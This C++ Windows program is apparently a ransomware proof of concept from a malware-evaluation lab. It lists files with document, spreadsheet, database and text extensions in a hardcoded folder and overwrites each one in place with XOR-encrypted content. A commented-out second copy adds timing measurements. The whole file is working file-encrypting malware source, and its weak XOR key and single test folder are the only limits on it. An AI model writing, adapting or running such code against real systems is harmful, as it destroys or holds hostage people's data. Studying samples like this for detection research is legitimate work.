#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <algorithm>

#pragma comment(lib, "Advapi32.lib")

// Target directory and file types
const std::string TARGET_DIR = "C:\\Users\\User\\Documents\\MalwareAnalysis\\MalwareEvaluation-main\\ClipboardLogger\\Debug\\Files";
const std::vector<std::string> TARGET_EXTENSIONS = { ".docx", ".xlsx", ".db", ".txt" };

// XOR Key (simple PoC)
const BYTE XOR_KEY = 0xAA;

// Extracts the file extension (returns in lower case, including dot)
std::string GetFileExtension(const std::string& filename) {
	size_t pos = filename.rfind('.');
	if (pos == std::string::npos) return "";
	std::string ext = filename.substr(pos);
	std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
	return ext;
}

// Function to check if file extension is targeted
bool IsTargetExtension(const std::string& filename) {
	std::string ext = GetFileExtension(filename);
	for (const auto& targetExt : TARGET_EXTENSIONS) {
		if (ext == targetExt) return true;
	}
	return false;
}

// Encrypt (XOR) buffer in place
void XorEncryptBuffer(std::vector<BYTE>& buffer) {
	for (auto& b : buffer) {
		b ^= XOR_KEY;
	}
}

// Encrypt a single file
bool EncryptFile(const std::string& filePath) {
	HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hFile == INVALID_HANDLE_VALUE) return false;

	DWORD fileSize = GetFileSize(hFile, nullptr);
	if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
		CloseHandle(hFile);
		return false;
	}

	// Read file content
	std::vector<BYTE> buffer(fileSize);
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, buffer.data(), fileSize, &bytesRead, nullptr) || bytesRead != fileSize) {
		CloseHandle(hFile);
		return false;
	}

	// Encrypt buffer
	XorEncryptBuffer(buffer);

	// Move file pointer to beginning and overwrite
	SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
	DWORD bytesWritten = 0;
	if (!WriteFile(hFile, buffer.data(), fileSize, &bytesWritten, nullptr) || bytesWritten != fileSize) {
		CloseHandle(hFile);
		return false;
	}

	CloseHandle(hFile);
	std::cout << "[+] Encrypted: " << filePath << std::endl;
	return true;
}

// Enumerate and encrypt target files
void EncryptTargetFiles(const std::string& directory) {
	std::string searchPath = directory + "\\*";
	WIN32_FIND_DATAA findData;
	HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

	if (hFind == INVALID_HANDLE_VALUE) {
		std::cerr << "[-] Could not open directory: " << directory << std::endl;
		return;
	}

	do {
		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue; // Skip directories

		std::string filename = findData.cFileName;
		std::string fullPath = directory + "\\" + filename;

		if (IsTargetExtension(filename)) {
			EncryptFile(fullPath);
		}

	} while (FindNextFileA(hFind, &findData));
	FindClose(hFind);
}

int main()
{
	std::string value;
	while (true)
	{
		// Output the current process Id
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: ";
		std::cout << GetProcessIdOfThread(currentThread);
		std::cout << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep and Encrypt Files (Ctrl-C to exit): ";
		std::getline(std::cin, value);

		// Beep as before
		Beep(500, 500);

		// Encrypt files in target directory
		EncryptTargetFiles(TARGET_DIR);
	}
	return 0;
}



/*
#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <algorithm>
#include <chrono> // For timing

#pragma comment(lib, "Advapi32.lib")

// Target directory and file types
const std::string TARGET_DIR = "C:\\Users\\User\\Documents\\MalwareAnalysis\\MalwareEvaluation-main\\ClipboardLogger\\Debug\\Files";
const std::vector<std::string> TARGET_EXTENSIONS = { ".docx", ".xlsx", ".db", ".txt" };

// XOR Key (simple PoC)
const BYTE XOR_KEY = 0xAA;

// Extracts the file extension (returns in lower case, including dot)
std::string GetFileExtension(const std::string& filename) {
	size_t pos = filename.rfind('.');
	if (pos == std::string::npos) return "";
	std::string ext = filename.substr(pos);
	std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
	return ext;
}

// Function to check if file extension is targeted
bool IsTargetExtension(const std::string & filename) {
	std::string ext = GetFileExtension(filename);
	for (const auto& targetExt : TARGET_EXTENSIONS) {
		if (ext == targetExt) return true;
	}
	return false;
}

// Encrypt (XOR) buffer in place
void XorEncryptBuffer(std::vector<BYTE> & buffer) {
	for (auto& b : buffer) {
		b ^= XOR_KEY;
	}
}

// Encrypt a single file, return time taken in microseconds by reference
bool EncryptFile(const std::string & filePath, double& durationOut) {
	auto start = std::chrono::high_resolution_clock::now();

	HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hFile == INVALID_HANDLE_VALUE) return false;

	DWORD fileSize = GetFileSize(hFile, nullptr);
	if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
		CloseHandle(hFile);
		return false;
	}

	// Read file content
	std::vector<BYTE> buffer(fileSize);
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, buffer.data(), fileSize, &bytesRead, nullptr) || bytesRead != fileSize) {
		CloseHandle(hFile);
		return false;
	}

	// Encrypt buffer
	XorEncryptBuffer(buffer);

	// Move file pointer to beginning and overwrite
	SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
	DWORD bytesWritten = 0;
	if (!WriteFile(hFile, buffer.data(), fileSize, &bytesWritten, nullptr) || bytesWritten != fileSize) {
		CloseHandle(hFile);
		return false;
	}

	CloseHandle(hFile);

	auto end = std::chrono::high_resolution_clock::now();
	std::chrono::duration<double, std::micro> duration = end - start;
	durationOut = duration.count();

	std::cout << "[+] Encrypted: " << filePath << " (Time: " << durationOut << " µs)\n";
	return true;
}

// Enumerate and encrypt target files with timing
void EncryptTargetFiles(const std::string & directory) {
	std::string searchPath = directory + "\\*";
	WIN32_FIND_DATAA findData;
	HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

	if (hFind == INVALID_HANDLE_VALUE) {
		std::cerr << "[-] Could not open directory: " << directory << std::endl;
		return;
	}

	int attemptCount = 0;
	double totalMicroseconds = 0.0;

	do {
		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue; // Skip directories

		std::string filename = findData.cFileName;
		std::string fullPath = directory + "\\" + filename;

		if (IsTargetExtension(filename)) {
			double duration = 0.0;
			bool success = EncryptFile(fullPath, duration);
			totalMicroseconds += duration;
			attemptCount++;

			if (!success) {
				std::cout << "[!] Failed to encrypt: " << filename << " (Time: " << duration << " µs)\n";
			}
		}

	} while (FindNextFileA(hFind, &findData));
	FindClose(hFind);

	if (attemptCount > 0) {
		double avgTime = totalMicroseconds / attemptCount;
		std::cout << "[*] Total files attempted: " << attemptCount << std::endl;
		std::cout << "[*] Total time spent: " << totalMicroseconds << " µs" << std::endl;
		std::cout << "[*] Average time per attempt: " << avgTime << " µs" << std::endl;
	}
	else {
		std::cout << "[!] No matching files to process.\n";
	}
}

int main()
{
	std::string value;
	while (true)
	{
		// Output the current process Id
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: ";
		std::cout << GetProcessIdOfThread(currentThread);
		std::cout << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep and Encrypt Files (Ctrl-C to exit): ";
		std::getline(std::cin, value);

		// Beep as before
		Beep(500, 500);

		std::cout << "[*] Attempting file encryption...\n";
		EncryptTargetFiles(TARGET_DIR);
		std::cout << std::endl;
	}
	return 0;
}
*/